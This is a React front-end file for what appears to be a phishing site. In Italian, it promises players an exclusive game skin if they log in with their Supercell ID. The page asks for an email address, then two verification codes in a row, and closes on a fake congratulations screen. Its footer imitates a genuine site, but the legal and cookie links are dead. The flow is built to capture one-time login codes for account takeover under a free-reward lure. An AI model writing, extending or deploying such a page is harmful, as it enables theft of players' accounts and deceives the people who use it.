import React, { useState } from 'react';
import Login from './components/Login';
import VerifyCode from './components/VerifyCode';
import Congrats from './components/Congrats';
import ProgressBar from './components/ProgressBar';

const steps = [
  'Start',
  'Login',
  'Verify',
  'Verify Again',
  'Congrats',
];

function StartPage({ onNext }) {
  return (
    <div>
      <img 
        src="/redeemWebsite/images/Mandy_Skin-Carnaval.webp" 
        alt="Mandy Skin" 
        style={{ 
          width: '160px',
          height: '160px',
          objectFit: 'cover',
          borderRadius: '20px',
          margin: '0 auto 32px auto',
          boxShadow: '0 2px 8px rgba(0,0,0,0.10)'
        }}
      />
      <h2>Accedi per riscattare una skin esclusiva!</h2>
      <div className="secondary-text" style={{ marginBottom: 24 }}>
        Effettua l'accesso con il tuo Supercell ID per ricevere subito la tua ricompensa.
      </div>
      <button type="button" onClick={onNext}>Accedi</button>
    </div>
  );
}

export default function App() {
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState('');
  const [code1, setCode1] = useState('');
  const [code2, setCode2] = useState('');
  const [showFooter, setShowFooter] = useState(true);

  return (
    <div className="app-bg">
      <div className="center-card">
        <ProgressBar step={step} total={steps.length - 2} />
        {step === 0 && <StartPage onNext={() => setStep(1)} />}
        {step === 1 && (
          <Login
            onSubmit={e => {
              setEmail(e);
              setStep(2);
            }}
          />
        )}
        {step === 2 && (
          <VerifyCode
            email={email}
            onSubmit={c => {
              setCode1(c);
              setStep(3);
            }}
            stepLabel="Almost there!"
          />
        )}
        {step === 3 && (
          <VerifyCode
            email={email}
            onSubmit={c => {
              setCode2(c);
              setStep(4);
            }}
            stepLabel="One more step!"
          />
        )}
        {step === 4 && <Congrats email={email} />}
      </div>
      
      {showFooter && (
        <div className="footer">
          <button 
            className="close-footer" 
            onClick={() => setShowFooter(false)}
            style={{
              position: 'absolute',
              top: '10px',
              right: '10px',
              background: 'none',
              border: 'none',
              color: '#fff',
              fontSize: '1.2rem',
              cursor: 'pointer',
              padding: '5px',
              width: 'auto'
            }}
          >
            ×
          </button>
          <div>
            <select className="language-select" defaultValue="it">
              <option value="it">Italiano</option>
              <option value="en">English</option>
              <option value="es">Español</option>
              <option value="fr">Français</option>
              <option value="de">Deutsch</option>
            </select>
          </div>
          <div className="footer-links">
            <a href="#" style={{ color: '#fff' }}>Normativa sulla privacy</a>
            <a href="#" style={{ color: '#fff' }}>Condizioni d'Uso</a>
            <a href="#" style={{ color: '#fff' }}>Gestisci cookie</a>
          </div>
          <div className="footer-logo" style={{ marginTop: 18 }}>
            <svg width="120" height="32" viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
              <g fill="#fff">
                <rect x="0" y="0" width="24" height="8" rx="2"/>
                <rect x="0" y="12" width="24" height="8" rx="2"/>
                <rect x="0" y="24" width="24" height="8" rx="2"/>
                <rect x="32" y="0" width="24" height="8" rx="2"/>
                <rect x="32" y="12" width="24" height="8" rx="2"/>
                <rect x="32" y="24" width="24" height="8" rx="2"/>
                <rect x="64" y="0" width="24" height="8" rx="2"/>
                <rect x="64" y="12" width="24" height="8" rx="2"/>
                <rect x="64" y="24" width="24" height="8" rx="2"/>
                <rect x="96" y="0" width="24" height="8" rx="2"/>
                <rect x="96" y="12" width="24" height="8" rx="2"/>
                <rect x="96" y="24" width="24" height="8" rx="2"/>
              </g>
            </svg>
          </div>
        </div>
      )}
    </div>
  );
} 